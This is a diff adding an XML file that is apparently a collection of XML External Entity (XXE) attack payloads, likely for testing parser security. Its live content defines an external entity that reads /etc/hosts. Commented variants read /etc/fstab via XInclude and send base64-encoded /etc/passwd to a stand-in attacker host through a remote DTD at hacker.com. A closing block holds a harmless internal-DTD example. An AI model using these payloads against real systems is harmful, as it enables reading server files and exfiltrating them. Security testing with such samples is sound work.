@@ -1,0 +1,130 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- If you want styles in XML:
+<?xml-stylesheet type="text/css" href="example.css"?>
+-->
+
+<!DOCTYPE MSG[
+  <!ELEMENT foo ANY>
+  <!ENTITY file SYSTEM "file:///etc/hosts">
+]>
+<MSG>
+  <foo>
+     &file;
+  </foo>
+</MSG>
+
+<!--  This is for Xinclude:
+<document xmlns:xi="http://www.w3.org/2001/XInclude">
+  <content>Very special content that is protected by copyright.</content>
+  <footer><xi:include href="http://hacker.com/test1.xml"/></footer>
+</document>
+
+Another variant:
+<document xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/fstab" parse="text"/>
+</document>
+-->
+
+<!-- Sending the contents of a file in your local system to an attacker via get request
+<!DOCTYPE MSG[
+  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://hacker.com/file.dtd">
+  %dtd;
+]>
+<MSG> &trick;</MSG>
+-->
+
+<!-- Get the contents of a file, that contains special (from XML point of view) chars
+<!DOCTYPE root [
+  <!ELEMENT foo ANY>
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///etc/fstab">
+  <!ENTITY % end "]]>">
+  <!ENTITY % dtd SYSTEM "http://hacker.com/file.dtd">
+  %dtd;
+]>
+<root>
+  <foo>
+     &trick;
+  </foo>
+</root>
+-->
+
+<!--  Classical reading of a local file
+<!DOCTYPE root [
+ <!ENTITY % xxe SYSTEM "http://hacker.com/file.dtd">
+ %xxe;
+]>
+<root>
+  <foo>
+    &trick;
+  </foo>
+</root>
+-->
+
+<!--If you want to use an external DTD:
+<!DOCTYPE all_obj SYSTEM "http://user.com/example.dtd">
+-->
+
+<!-- File with internal DTD:
+<!DOCTYPE all_obj[
+  <!ELEMENT all_obj (people_list,notes)>
+  <!ELEMENT people_list (person*)>
+  <!ELEMENT person (name, birthdate?, gender?, socialsecuritynumber?, foo?)>
+  <!ELEMENT name (#PCDATA) >
+  <!ELEMENT birthdate (#PCDATA) >
+  <!ELEMENT gender (#PCDATA) >
+  <!ELEMENT socialsecuritynumber (#PCDATA) >
+  <!ELEMENT foo (#PCDATA)>
+  <!ENTITY nbsp "&#xA0;">
+  <!ENTITY writer "Writer: DD">
+  <!ENTITY cop "copy: Hello">
+  <!ELEMENT notes (note*)>
+  <!ELEMENT note (from, to, heading?, body)>
+  <!ELEMENT from (#PCDATA) >
+  <!ELEMENT to (#PCDATA) >
+  <!ELEMENT heading (#PCDATA) >
+  <!ELEMENT body (#PCDATA) >
+]>
+
+<all_obj>
+  <people_list>
+     <person>
+        <name>
+           Fred Bloggs
+        </name>
+        <birthdate>
+           27/11/2008
+        </birthdate>
+        <gender>
+           Male
+        </gender>
+        <socialsecuritynumber>
+           1234567890
+        </socialsecuritynumber>
+        <foo>
+          &writer;
+          &nbsp;
+          &cop;
+        </foo>
+     </person>
+  </people_list>
+
+  <notes>
+    <note>
+      <from>
+        Jane
+      </from>
+      <to>
+        Bob
+      </to>
+      <heading>
+        Fish
+      </heading>
+      <body>
+        Seledka
+      </body>
+    </note>
+  </notes>
+</all_obj>
+-->
